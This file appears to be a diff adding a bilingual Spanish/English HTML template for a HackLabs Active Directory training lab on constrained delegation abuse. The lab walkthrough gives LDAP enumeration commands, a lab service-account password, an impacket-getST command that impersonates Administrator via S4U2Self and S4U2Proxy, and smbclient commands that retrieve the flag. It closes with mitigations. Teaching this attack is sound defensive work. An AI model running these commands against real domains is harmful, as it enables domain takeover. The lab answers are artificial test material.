@@ -1,0 +1,118 @@
+{% extends "base.html" %}
+{% block title %}AD 14 – Constrained Delegation – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_delegation_obj_desc">La cuenta svc.delegate tiene delegación restringida con transición de protocolo hacia cifs/dc01. Consigue su contraseña (Kerberoasting, lab AD 05) y demuestra el control total que le otorgaría: acceso directo a //DC01/deleg y, en un dominio real, impersonación de Administrator vía S4U2Self + S4U2Proxy.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>//{{ ad_dc_host }}/deleg/flag-ad-14.txt</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la barra lateral.</span></p>
+  </div>
+
+  {% include 'labs/_ad_target.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2 text-amber-500"><i class="ph ph-warning"></i> Nota sobre este Domain Controller</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400">S4U2Self y S4U2Proxy son, a nivel de protocolo, variantes del TGS-REQ que el KDC embebido de Samba no completa de forma fiable con las herramientas actuales (la misma limitación que afecta a Kerberoasting). La configuración de delegación es <strong>real y auditable por LDAP</strong>: <code>svc.delegate</code> tiene <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> y <code>msDS-AllowedToDelegateTo=cifs/{{ ad_dc_fqdn }}</code>. Este lab demuestra el impacto accediendo directamente con las credenciales de <code>svc.delegate</code> — la cuenta que, en un dominio real, usarías con <code>impacket-getST</code> para suplantar a cualquier usuario frente a ese servicio.</p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Contraseña de svc.delegate obtenida en el lab AD 05 (Kerberoasting)
+smbclient //{{ ad_dc_ip }}/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt -'</pre>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>1 · Qué es la delegación restringida (KCD)</h3>
+    <p>La delegación restringida deja que una cuenta pida tickets <em>en nombre de un usuario</em> hacia un conjunto concreto de servicios (atributo <code>msDS-AllowedToDelegateTo</code>). Si además tiene <strong>transición de protocolo</strong> (<code>TrustedToAuthForDelegation</code>, bit 0x1000000), puede hacerlo para cualquier usuario aunque ese usuario nunca se haya autenticado — incluido Administrator. Ahí está el abuso: S4U2Self obtiene un ticket como el usuario suplantado, y S4U2Proxy lo reenvía al servicio permitido.</p>
+
+    <h3>2 · Localizar cuentas con delegación (esto sí funciona en vivo)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(msDS-AllowedToDelegateTo=*)' \
+  sAMAccountName msDS-AllowedToDelegateTo userAccountControl</pre>
+    <pre>sAMAccountName: svc.delegate
+msDS-AllowedToDelegateTo: cifs/{{ ad_dc_fqdn }}
+userAccountControl: ... (TRUSTED_TO_AUTH_FOR_DELEGATION)</pre>
+    <p>Esta consulta es real: la configuración de delegación existe genuinamente en el directorio y es auditable con cualquier herramienta LDAP.</p>
+
+    <h3>3 · Conseguir la credencial de svc.delegate</h3>
+    <p><code>svc.delegate</code> tiene un SPN, así que es kerberoasteable (lab AD 05). Su contraseña es <code>iloveyou1</code>. Si vienes de aquel lab ya la tienes.</p>
+
+    <h3>4 · El impacto real: S4U2Self + S4U2Proxy (comando real, contra Windows funciona así)</h3>
+    <pre>impacket-getST \
+  -spn 'cifs/{{ ad_dc_fqdn }}' \
+  -impersonate Administrator \
+  '{{ ad_realm_lower }}/svc.delegate:iloveyou1' \
+  -dc-ip $DC</pre>
+    <p><strong>Nota sobre este laboratorio:</strong> S4U2Self/S4U2Proxy son intercambios TGS-REQ, y el KDC de Samba no los completa de forma fiable con las herramientas actuales (misma limitación que Kerberoasting). Contra un Domain Controller Windows real, este comando te daría un ticket válido como Administrator sobre el servicio CIFS del objetivo — control total sin conocer la contraseña de Administrator.</p>
+
+    <h3>5 · Demostrar el impacto en este laboratorio</h3>
+    <p>Con la contraseña real de <code>svc.delegate</code> ya tienes la llave que habilita toda la cadena de delegación. Accede directamente al recurso protegido:</p>
+    <pre>nxc smb $DC -u 'svc.delegate' -p 'iloveyou1' --shares
+
+smbclient //$DC/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigación</h3>
+    <ul>
+      <li>Evitar la delegación con transición de protocolo; preferir delegación restringida basada en recursos (RBCD) bien acotada.</li>
+      <li>Marcar las cuentas sensibles como <em>Account is sensitive and cannot be delegated</em> y añadirlas a <em>Protected Users</em>.</li>
+      <li>Revisar periódicamente <code>msDS-AllowedToDelegateTo</code> y los bits de delegación en <code>userAccountControl</code>.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">impacket-getST</span> <span class="tools-badge">impacket-GetUserSPNs</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">Rubeus (s4u)</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>1 · What constrained delegation (KCD) is</h3>
+    <p>Constrained delegation lets an account request tickets <em>on behalf of a user</em> towards a specific set of services (the <code>msDS-AllowedToDelegateTo</code> attribute). If it also has <strong>protocol transition</strong> (<code>TrustedToAuthForDelegation</code>, bit 0x1000000), it can do so for any user even if that user never authenticated — including Administrator. That is the abuse: S4U2Self gets a ticket as the impersonated user, and S4U2Proxy forwards it to the allowed service.</p>
+
+    <h3>2 · Find accounts with delegation (this works live)</h3>
+    <pre>export DC={{ ad_dc_ip }}
+export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
+
+ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "$BASEDN" '(msDS-AllowedToDelegateTo=*)' \
+  sAMAccountName msDS-AllowedToDelegateTo userAccountControl</pre>
+    <pre>sAMAccountName: svc.delegate
+msDS-AllowedToDelegateTo: cifs/{{ ad_dc_fqdn }}
+userAccountControl: ... (TRUSTED_TO_AUTH_FOR_DELEGATION)</pre>
+    <p>This query is real: the delegation configuration genuinely exists in the directory and is auditable with any LDAP tool.</p>
+
+    <h3>3 · Get svc.delegate's credential</h3>
+    <p><code>svc.delegate</code> has an SPN, so it is kerberoastable (lab AD 05). Its password is <code>iloveyou1</code>. If you came from that lab you already have it.</p>
+
+    <h3>4 · The real impact: S4U2Self + S4U2Proxy (real command, works exactly like this against Windows)</h3>
+    <pre>impacket-getST \
+  -spn 'cifs/{{ ad_dc_fqdn }}' \
+  -impersonate Administrator \
+  '{{ ad_realm_lower }}/svc.delegate:iloveyou1' \
+  -dc-ip $DC</pre>
+    <p><strong>Note about this lab:</strong> S4U2Self/S4U2Proxy are TGS-REQ exchanges, and Samba's KDC doesn't complete them reliably with current tooling (same limitation as Kerberoasting). Against a real Windows Domain Controller, this command would hand you a valid ticket as Administrator for the target's CIFS service — full control without ever knowing Administrator's password.</p>
+
+    <h3>5 · Demonstrate the impact in this lab</h3>
+    <p>With svc.delegate's real password you already hold the key that enables the whole delegation chain. Access the protected share directly:</p>
+    <pre>nxc smb $DC -u 'svc.delegate' -p 'iloveyou1' --shares
+
+smbclient //$DC/deleg -U '{{ ad_domain }}\svc.delegate%iloveyou1' -c 'get flag-ad-14.txt -'</pre>
+    <pre>HL{···}</pre>
+
+    <h3>Mitigation</h3>
+    <ul>
+      <li>Avoid delegation with protocol transition; prefer tightly scoped resource-based constrained delegation (RBCD).</li>
+      <li>Mark sensitive accounts as <em>Account is sensitive and cannot be delegated</em> and add them to <em>Protected Users</em>.</li>
+      <li>Regularly review <code>msDS-AllowedToDelegateTo</code> and the delegation bits in <code>userAccountControl</code>.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">impacket-getST</span> <span class="tools-badge">impacket-GetUserSPNs</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">Rubeus (s4u)</span></div>
+  </div>
+</div>
+{% endblock %}
